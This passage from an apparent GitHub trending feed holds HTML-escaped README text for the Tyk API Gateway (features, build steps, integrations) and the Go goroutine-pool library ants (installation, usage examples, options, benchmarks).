Authentication: &lt;a href=&#34;https://tyk.io/docs/advanced-configuration/integrate/api-auth-mode/open-id-connect/#setting-up-oidc&#34;&gt;OIDC&lt;/a&gt;, &lt;a href=&#34;https://tyk.io/docs/tyk-apis/tyk-gateway-api/api-definition-objects/jwt/&#34;&gt;JWT,&lt;/a&gt; &lt;a href=&#34;https://tyk.io/docs/basic-config-and-security/security/authentication-authorization/bearer-tokens/&#34;&gt;bearer Tokens&lt;/a&gt;, &lt;a href=&#34;https://tyk.io/docs/tyk-apis/tyk-dashboard-api/basic-authentication/&#34;&gt;Basic Auth&lt;/a&gt;, Client Certificates and more.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/getting-started/import-apis/&#34;&gt;Open API Standards:&lt;/a&gt; Import your Swagger and OAS2/3 documents to scaffold APIs in Tyk.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/performance-tuning-your-tyk-api-gateway/&#34;&gt;Ultra performant&lt;/a&gt;: Low latency, and thousands of rps with just a single CPU, horizontally and vertically scalable.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/advanced-configuration/transform-traffic/&#34;&gt;Content mediation&lt;/a&gt;: Transform all the things, from request or response headers to converting between SOAP and GraphQL.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/plugins/&#34;&gt;Extensible Plugin Architecture&lt;/a&gt;: Customize Tyk’s middleware chain by writing plugins in your language of choice - from Python to Javascript to Go, or any language which supports gRPC.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/basic-config-and-security/control-limit-traffic/rate-limiting/#setting-rate-limits-in-the-tyk-community-edition-gateway-ce&#34;&gt;Rate Limiting&lt;/a&gt; &amp;amp; Quotas: Protect your upstreams from becoming overloaded and/or apply limits for each consumer.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-apis/tyk-gateway-api/api-definition-objects/versioning-endpoint/&#34;&gt;API Versioning&lt;/a&gt; - API Versions can be easily set and deprecated at a specific time and date.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/security/security-policies/secure-apis-method-path/&#34;&gt;Granular Access Control&lt;/a&gt; - Grant access to one or more APIs on a per version and operation basis.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-apis/tyk-gateway-api/api-definition-objects/ip-blacklisting/&#34;&gt;Blocklist&lt;/a&gt;/&lt;a href=&#34;https://tyk.io/docs/tyk-apis/tyk-gateway-api/api-definition-objects/ip-whitelisting/&#34;&gt;Allowlist&lt;/a&gt;/Ignored endpoint access - Enforce strict security models on a version-by-version basis to your access points.&lt;/p&gt; &#xA;&lt;p&gt;Analytics logging - Record detailed usage data on who is using your API&#39;s (raw data only)&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-apis/tyk-gateway-api/api-definition-objects/cors/&#34;&gt;CORS&lt;/a&gt; - Enable CORS for certain APIs so users can make browser-based requests&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/basic-config-and-security/report-monitor-trigger-events/webhooks/&#34;&gt;Webhooks&lt;/a&gt; - Trigger webhooks against events such as Quota Violations and Authentication failures&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-apis/tyk-gateway-api/api-definition-objects/ip-whitelisting/&#34;&gt;IP AllowListing&lt;/a&gt; - Block access to non-trusted IP addresses for more secure interactions&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-configuration-reference/hot-restart-tyk-gateway-process/&#34;&gt;Hitless reloads&lt;/a&gt; - Tyk configurations can be altered dynamically and the service restarted without affecting any active request&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-oss/ce-helm-chart/&#34;&gt;Kubernetes native&lt;/a&gt; declarative API: using Open Source &lt;a href=&#34;https://github.com/TykTechnologies/tyk-operator&#34;&gt;Tyk Operator&lt;/a&gt; (more info in OSS section)&lt;/p&gt; &#xA;&lt;h1&gt;Quick Start on your platform&lt;/h1&gt; &#xA;&lt;p&gt;Get Started today with Tyk Gateway (standalone)&lt;/p&gt; &#xA;&lt;p&gt;Install&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-oss/ce-docker/&#34;&gt;Docker&lt;/a&gt; (Recommended method)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/TykTechnologies/tyk-oss-k8s-deployment&#34;&gt; Kubernetes-Native &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/TykTechnologies/tyk-helm-chart#install-tyk-community-edition&#34;&gt;Kubernetes-Helm&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-oss/ce-ansible/&#34;&gt;Ansible&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-oss/ce-redhat/&#34;&gt;Red Hat&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-oss/ce-ubuntu/&#34;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tyk.io/docs/tyk-oss/ce-centos/&#34;&gt;CentOS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Compile from Source (see instructions below)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h1&gt;Compiling Tyk Gateway&lt;/h1&gt; &#xA;&lt;p&gt;Compile from Source&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/TykTechnologies/tyk&#xA;go build&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Go version 1.12 is required to build &lt;code&gt;master&lt;/code&gt;, the current development version. Tyk is officially supported on &lt;code&gt;linux/amd64&lt;/code&gt;, &lt;code&gt;linux/i386&lt;/code&gt; and &lt;code&gt;linux/arm64&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Tests are run against both Go versions 1.12, 1.13, 1.14 and 1.15, however at present, only Go 1.12 is officially supported. In order to run tests locally use the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;go test ./...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that tests require Redis to be running on the same machine (default port).&lt;/p&gt; &#xA;&lt;p&gt;In order to write your own test pls use this guide &lt;a href=&#34;https://github.com/TykTechnologies/tyk/raw/master/TESTING.md&#34;&gt;https://github.com/TykTechnologies/tyk/blob/master/TESTING.md&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Contributing&lt;/h1&gt; &#xA;&lt;p&gt;For more information about contributing PRs and issues, see &lt;a href=&#34;https://github.com/TykTechnologies/tyk/raw/master/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Tyk OSS Integrations&lt;/h1&gt; &#xA;&lt;p&gt;Tyk Technologies maintains other Open Source Software which can be used in conjunction with Tyk API Gateway:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/TykTechnologies/tyk-pump&#34;&gt;Tyk Pump&lt;/a&gt; - Pluggable analytics purger to move Analytics generated by your Tyk nodes to any back-end.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/TykTechnologies/tyk-operator&#34;&gt;Tyk Operator&lt;/a&gt; - Brings API Management capabilities to Kubernetes. Configure Ingress, APIs, Security Policies, Authentication, Authorization, Mediation and more - all using Custom Resources and Kubernetes Native primitives&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/TykTechnologies/tyk-identity-broker&#34;&gt;Tyk Identity Broker&lt;/a&gt; - Tyk Authentication Proxy for third-party login&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/TykTechnologies/tyk-sync&#34;&gt;Tyk Sync &lt;/a&gt;- Command line tool and library to manage and synchronise a Tyk installation with your version control system (VCS).&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/TykTechnologies/mserv&#34;&gt;Tyk Mserv&lt;/a&gt; - Asset Server and gRPC host&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/14009/112309048-ea210800-8cb3-11eb-8e8e-dceb4cae4cad.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Documentation&lt;/h1&gt; &#xA;&lt;p&gt;All the documentation for Tyk Gateway and other OSS can be found at &lt;a href=&#34;https://tyk.io/docs/tyk-oss-gateway/&#34;&gt;https://tyk.io/docs/tyk-oss-gateway/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Community&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://community.tyk.io&#34;&gt;Tyk Community Board&lt;/a&gt; - Technical support from the Tyk Community&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/TykTechnologies/tyk/issues/new/choose&#34;&gt;Write a GitHub Issue&lt;/a&gt; - Feature requests &amp;amp; bug reports welcome&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tyk.io/api-expertise/blog/&#34;&gt;Technical blog&lt;/a&gt; - Tyk announcements and updates&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pages.tyk.io/newsletter&#34;&gt;Newsletters &lt;/a&gt;- Subscribe to our GraphQL &amp;amp; API newsletters&lt;/li&gt; &#xA; &lt;li&gt;If you are using Tyk give us a star ⭐️&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Open Source License&lt;/h1&gt; &#xA;&lt;p&gt;Tyk is released under the MPL v2.0; please see &lt;a href=&#34;https://github.com/TykTechnologies/tyk/raw/master/LICENSE.md&#34;&gt;LICENSE.md&lt;/a&gt; for a full version of the license.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://app.fossa.io/api/projects/git%2Bgithub.com%2FTykTechnologies%2Ftyk.svg?type=large&#34; alt=&#34;FOSSA Status&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>panjf2000/ants</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/panjf2000/ants</id>
    <link href="https://github.com/panjf2000/ants" rel="alternate"></link>
    <summary type="html">&lt;p&gt;🐜🐜🐜 ants is a high-performance and low-cost goroutine pool in Go, inspired by fasthttp./ ants 是一个高性能且低损耗的 goroutine 池。&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/panjf2000/logos/master/ants/logo.png&#34;&gt; &lt;b&gt;A goroutine pool for Go&lt;/b&gt; &lt;br&gt;&lt;br&gt; &lt;a title=&#34;Build Status&#34; target=&#34;_blank&#34; href=&#34;https://github.com/panjf2000/ants/actions?query=workflow%3ATests&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/workflow/status/panjf2000/ants/Tests?style=flat-square&amp;amp;logo=github-actions&#34;&gt;&lt;/a&gt; &lt;a title=&#34;Codecov&#34; target=&#34;_blank&#34; href=&#34;https://codecov.io/gh/panjf2000/ants&#34;&gt;&lt;img src=&#34;https://img.shields.io/codecov/c/github/panjf2000/ants?style=flat-square&amp;amp;logo=codecov&#34;&gt;&lt;/a&gt; &lt;a title=&#34;Release&#34; target=&#34;_blank&#34; href=&#34;https://github.com/panjf2000/ants/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/release/panjf2000/ants.svg?color=161823&amp;amp;style=flat-square&amp;amp;logo=smartthings&#34;&gt;&lt;/a&gt; &lt;a title=&#34;Tag&#34; target=&#34;_blank&#34; href=&#34;https://github.com/panjf2000/ants/tags&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/tag/panjf2000/ants?color=%23ff8936&amp;amp;logo=fitbit&amp;amp;style=flat-square&#34;&gt;&lt;/a&gt; &lt;br&gt; &lt;a title=&#34;Chat Room&#34; target=&#34;_blank&#34; href=&#34;https://gitter.im/ants-pool/ants?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=body_badge&#34;&gt;&lt;img src=&#34;https://badges.gitter.im/ants-pool/ants.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a title=&#34;Go Report Card&#34; target=&#34;_blank&#34; href=&#34;https://goreportcard.com/report/github.com/panjf2000/ants&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/panjf2000/ants?style=flat-square&#34;&gt;&lt;/a&gt; &lt;a title=&#34;Doc for ants&#34; target=&#34;_blank&#34; href=&#34;https://pkg.go.dev/github.com/panjf2000/ants/v2?tab=doc&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/go.dev-doc-007d9c?style=flat-square&amp;amp;logo=read-the-docs&#34;&gt;&lt;/a&gt; &lt;a title=&#34;Mentioned in Awesome Go&#34; target=&#34;_blank&#34; href=&#34;https://github.com/avelino/awesome-go#goroutines&#34;&gt;&lt;img src=&#34;https://awesome.re/mentioned-badge-flat.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;p&gt;English | &lt;a href=&#34;https://raw.githubusercontent.com/panjf2000/ants/master/README_ZH.md&#34;&gt;🇨🇳中文&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;📖 Introduction&lt;/h2&gt; &#xA;&lt;p&gt;Library &lt;code&gt;ants&lt;/code&gt; implements a goroutine pool with fixed capacity, managing and recycling a massive number of goroutines, allowing developers to limit the number of goroutines in your concurrent programs.&lt;/p&gt; &#xA;&lt;h2&gt;🚀 Features:&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Managing and recycling a massive number of goroutines automatically&lt;/li&gt; &#xA; &lt;li&gt;Purging overdue goroutines periodically&lt;/li&gt; &#xA; &lt;li&gt;Abundant APIs: submitting tasks, getting the number of running goroutines, tuning capacity of pool dynamically, releasing pool, rebooting pool&lt;/li&gt; &#xA; &lt;li&gt;Handle panic gracefully to prevent programs from crash&lt;/li&gt; &#xA; &lt;li&gt;Efficient&amp;nbsp;in&amp;nbsp;memory&amp;nbsp;usage and it even achieves&amp;nbsp;&lt;a href=&#34;https://raw.githubusercontent.com/panjf2000/ants/master/#-performance-summary&#34;&gt;higher performance&lt;/a&gt;&amp;nbsp;than unlimited goroutines in Golang&lt;/li&gt; &#xA; &lt;li&gt;Nonblocking mechanism&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;⚔️ Tested in the following Golang releases:&lt;/h2&gt; &#xA;&lt;p&gt;All releases from &lt;strong&gt;Go1.8.x&lt;/strong&gt; to &lt;strong&gt;Go1.16.x&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;💡 How &lt;code&gt;ants&lt;/code&gt; works&lt;/h2&gt; &#xA;&lt;h3&gt;Flow Diagram&lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img width=&#34;1011&#34; alt=&#34;ants-flowchart-en&#34; src=&#34;https://user-images.githubusercontent.com/7496278/66396509-7b42e700-ea0c-11e9-8612-b71a4b734683.png&#34;&gt; &lt;/p&gt; &#xA;&lt;h3&gt;Activity Diagrams&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/panjf2000/illustrations/master/go/ants-pool-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/panjf2000/illustrations/master/go/ants-pool-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/panjf2000/illustrations/master/go/ants-pool-3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/panjf2000/illustrations/master/go/ants-pool-4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;🧰 How to install&lt;/h2&gt; &#xA;&lt;h3&gt;For &lt;code&gt;ants&lt;/code&gt; v1&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;go get -u github.com/panjf2000/ants&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;For &lt;code&gt;ants&lt;/code&gt; v2 (with GO111MODULE=on)&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;go get -u github.com/panjf2000/ants/v2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;🛠 How to use&lt;/h2&gt; &#xA;&lt;p&gt;Just take a imagination that your program starts a massive number of goroutines, resulting in a huge consumption of memory. To mitigate that kind of situation, all you need to do is to import &lt;code&gt;ants&lt;/code&gt; package and submit all your tasks to a default pool with fixed capacity, activated when package &lt;code&gt;ants&lt;/code&gt; is imported:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main&#xA;&#xA;import (&#xA;&#x9;&#34;fmt&#34;&#xA;&#x9;&#34;sync&#34;&#xA;&#x9;&#34;sync/atomic&#34;&#xA;&#x9;&#34;time&#34;&#xA;&#xA;&#x9;&#34;github.com/panjf2000/ants/v2&#34;&#xA;)&#xA;&#xA;var sum int32&#xA;&#xA;func myFunc(i interface{}) {&#xA;&#x9;n := i.(int32)&#xA;&#x9;atomic.AddInt32(&amp;amp;sum, n)&#xA;&#x9;fmt.Printf(&#34;run with %d\n&#34;, n)&#xA;}&#xA;&#xA;func demoFunc() {&#xA;&#x9;time.Sleep(10 * time.Millisecond)&#xA;&#x9;fmt.Println(&#34;Hello World!&#34;)&#xA;}&#xA;&#xA;func main() {&#xA;&#x9;defer ants.Release()&#xA;&#xA;&#x9;runTimes := 1000&#xA;&#xA;&#x9;// Use the common pool.&#xA;&#x9;var wg sync.WaitGroup&#xA;&#x9;syncCalculateSum := func() {&#xA;&#x9;&#x9;demoFunc()&#xA;&#x9;&#x9;wg.Done()&#xA;&#x9;}&#xA;&#x9;for i := 0; i &amp;lt; runTimes; i++ {&#xA;&#x9;&#x9;wg.Add(1)&#xA;&#x9;&#x9;_ = ants.Submit(syncCalculateSum)&#xA;&#x9;}&#xA;&#x9;wg.Wait()&#xA;&#x9;fmt.Printf(&#34;running goroutines: %d\n&#34;, ants.Running())&#xA;&#x9;fmt.Printf(&#34;finish all tasks.\n&#34;)&#xA;&#xA;&#x9;// Use the pool with a function,&#xA;&#x9;// set 10 to the capacity of goroutine pool and 1 second for expired duration.&#xA;&#x9;p, _ := ants.NewPoolWithFunc(10, func(i interface{}) {&#xA;&#x9;&#x9;myFunc(i)&#xA;&#x9;&#x9;wg.Done()&#xA;&#x9;})&#xA;&#x9;defer p.Release()&#xA;&#x9;// Submit tasks one by one.&#xA;&#x9;for i := 0; i &amp;lt; runTimes; i++ {&#xA;&#x9;&#x9;wg.Add(1)&#xA;&#x9;&#x9;_ = p.Invoke(int32(i))&#xA;&#x9;}&#xA;&#x9;wg.Wait()&#xA;&#x9;fmt.Printf(&#34;running goroutines: %d\n&#34;, p.Running())&#xA;&#x9;fmt.Printf(&#34;finish all tasks, result is %d\n&#34;, sum)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Functional options for ants pool&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Option represents the optional function.&#xA;type Option func(opts *Options)&#xA;&#xA;// Options contains all options which will be applied when instantiating a ants pool.&#xA;type Options struct {&#xA;&#x9;// ExpiryDuration is a period for the scavenger goroutine to clean up those expired workers,&#xA;&#x9;// the scavenger scans all workers every `ExpiryDuration` and clean up those workers that haven&#39;t been&#xA;&#x9;// used for more than `ExpiryDuration`.&#xA;&#x9;ExpiryDuration time.Duration&#xA;&#xA;&#x9;// PreAlloc indicates whether to make memory pre-allocation when initializing Pool.&#xA;&#x9;PreAlloc bool&#xA;&#xA;&#x9;// Max number of goroutine blocking on pool.Submit.&#xA;&#x9;// 0 (default value) means no such limit.&#xA;&#x9;MaxBlockingTasks int&#xA;&#xA;&#x9;// When Nonblocking is true, Pool.Submit will never be blocked.&#xA;&#x9;// ErrPoolOverload will be returned when Pool.Submit cannot be done at once.&#xA;&#x9;// When Nonblocking is true, MaxBlockingTasks is inoperative.&#xA;&#x9;Nonblocking bool&#xA;&#xA;&#x9;// PanicHandler is used to handle panics from each worker goroutine.&#xA;&#x9;// if nil, panics will be thrown out again from worker goroutines.&#xA;&#x9;PanicHandler func(interface{})&#xA;&#xA;&#x9;// Logger is the customized logger for logging info, if it is not set,&#xA;&#x9;// default standard logger from log package is used.&#xA;&#x9;Logger Logger&#xA;}&#xA;&#xA;// WithOptions accepts the whole options config.&#xA;func WithOptions(options Options) Option {&#xA;&#x9;return func(opts *Options) {&#xA;&#x9;&#x9;*opts = options&#xA;&#x9;}&#xA;}&#xA;&#xA;// WithExpiryDuration sets up the interval time of cleaning up goroutines.&#xA;func WithExpiryDuration(expiryDuration time.Duration) Option {&#xA;&#x9;return func(opts *Options) {&#xA;&#x9;&#x9;opts.ExpiryDuration = expiryDuration&#xA;&#x9;}&#xA;}&#xA;&#xA;// WithPreAlloc indicates whether it should malloc for workers.&#xA;func WithPreAlloc(preAlloc bool) Option {&#xA;&#x9;return func(opts *Options) {&#xA;&#x9;&#x9;opts.PreAlloc = preAlloc&#xA;&#x9;}&#xA;}&#xA;&#xA;// WithMaxBlockingTasks sets up the maximum number of goroutines that are blocked when it reaches the capacity of pool.&#xA;func WithMaxBlockingTasks(maxBlockingTasks int) Option {&#xA;&#x9;return func(opts *Options) {&#xA;&#x9;&#x9;opts.MaxBlockingTasks = maxBlockingTasks&#xA;&#x9;}&#xA;}&#xA;&#xA;// WithNonblocking indicates that pool will return nil when there is no available workers.&#xA;func WithNonblocking(nonblocking bool) Option {&#xA;&#x9;return func(opts *Options) {&#xA;&#x9;&#x9;opts.Nonblocking = nonblocking&#xA;&#x9;}&#xA;}&#xA;&#xA;// WithPanicHandler sets up panic handler.&#xA;func WithPanicHandler(panicHandler func(interface{})) Option {&#xA;&#x9;return func(opts *Options) {&#xA;&#x9;&#x9;opts.PanicHandler = panicHandler&#xA;&#x9;}&#xA;}&#xA;&#xA;// WithLogger sets up a customized logger.&#xA;func WithLogger(logger Logger) Option {&#xA;&#x9;return func(opts *Options) {&#xA;&#x9;&#x9;opts.Logger = logger&#xA;&#x9;}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;ants.Options&lt;/code&gt;contains all optional configurations of ants pool, which allows you to customize the goroutine pool by invoking option functions to set up each configuration in &lt;code&gt;NewPool&lt;/code&gt;/&lt;code&gt;NewPoolWithFunc&lt;/code&gt;method.&lt;/p&gt; &#xA;&lt;h3&gt;Customize limited pool&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;ants&lt;/code&gt; also supports customizing the capacity of pool. You can invoke the &lt;code&gt;NewPool&lt;/code&gt; method to instantiate a pool with a given capacity, as following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Set 10000 the size of goroutine pool&#xA;p, _ := ants.NewPool(10000)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Submit tasks&lt;/h3&gt; &#xA;&lt;p&gt;Tasks can be submitted by calling &lt;code&gt;ants.Submit(func())&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;ants.Submit(func(){})&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Tune pool capacity in runtime&lt;/h3&gt; &#xA;&lt;p&gt;You can tune the capacity of &lt;code&gt;ants&lt;/code&gt; pool in runtime with &lt;code&gt;Tune(int)&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;pool.Tune(1000) // Tune its capacity to 1000&#xA;pool.Tune(100000) // Tune its capacity to 100000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Don&#39;t worry about the synchronous problems in this case, the method here is thread-safe (or should be called goroutine-safe).&lt;/p&gt; &#xA;&lt;h3&gt;Pre-malloc goroutine queue in pool&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;ants&lt;/code&gt; allows you to pre-allocate memory of goroutine queue in pool, which may get a performance enhancement under some special certain circumstances such as the scenario that requires a pool with ultra-large capacity, meanwhile each task in goroutine lasts for a long time, in this case, pre-mallocing will reduce a lot of memory allocation in goroutine queue.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// ants will pre-malloc the whole capacity of pool when you invoke this method&#xA;p, _ := ants.NewPool(100000, ants.WithPreAlloc(true))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Release Pool&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;pool.Release()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Reboot Pool&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// A pool that has been released can be still used once you invoke the Reboot().&#xA;pool.Reboot()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;⚙️ About sequence&lt;/h2&gt; &#xA;&lt;p&gt;All tasks submitted to &lt;code&gt;ants&lt;/code&gt; pool will not be guaranteed to be addressed in order, because those tasks scatter among a series of concurrent workers, thus those tasks would be executed concurrently.&lt;/p&gt; &#xA;&lt;h2&gt;🧲 Benchmarks&lt;/h2&gt; &#xA;&lt;div align=&#34;center&#34;&gt;&#xA; &lt;img src=&#34;https://user-images.githubusercontent.com/7496278/51515466-c7ce9e00-1e4e-11e9-89c4-bd3785b3c667.png&#34;&gt;&#xA;&lt;/div&gt; In this benchmark result, the first and second benchmarks performed test cases with 1M tasks and the rest of benchmarks performed test cases with 10M tasks, both in unlimited goroutines and `ants` pool, and the capacity of this `ants` goroutine-pool was limited to 50K. &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;BenchmarkGoroutine-4 represents the benchmarks with unlimited goroutines in golang.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;BenchmarkPoolGroutine-4 represents the benchmarks with a &lt;code&gt;ants&lt;/code&gt; pool.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Benchmarks with Pool&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/7496278/51515499-f187c500-1e4e-11e9-80e5-3df8f94fa70f.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;In above benchmark result, the first and second benchmarks performed test cases with 1M tasks and the rest of benchmarks performed test cases with 10M tasks, both in unlimited goroutines and &lt;code&gt;ants&lt;/code&gt; pool, and the capacity of this &lt;code&gt;ants&lt;/code&gt; goroutine-pool was limited to 50K.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;As you can see, &lt;code&gt;ants&lt;/code&gt; performs 2 times faster than goroutines without pool (10M tasks) and it only consumes&amp;nbsp;half the memory comparing with goroutines without pool. (both in 1M and 10M tasks)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Benchmarks with PoolWithFunc&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/7496278/51515565-1e3bdc80-1e4f-11e9-8a08-452ab91d117e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Throughput (it is suitable for scenarios where tasks are submitted asynchronously without waiting for the final results)&lt;/h3&gt; &#xA;&lt;h4&gt;100K tasks&lt;/h4&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/7496278/51515590-36abf700-1e4f-11e9-91e4-7bd3dcb5f4a5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h4&gt;1M tasks&lt;/h4&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/7496278/51515596-44617c80-1e4f-11e9-89e3-01e19d2979a1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h4&gt;10M tasks&lt;/h4&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/7496278/52987732-537c2000-3437-11e9-86a6-177f00d7a1d6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;📊 Performance Summary&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/7496278/63449727-3ae6d400-c473-11e9-81e3-8b3280d8288a.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;In conclusion, &lt;code&gt;ants&lt;/code&gt; performs 2~6 times faster than goroutines without a pool and the memory consumption 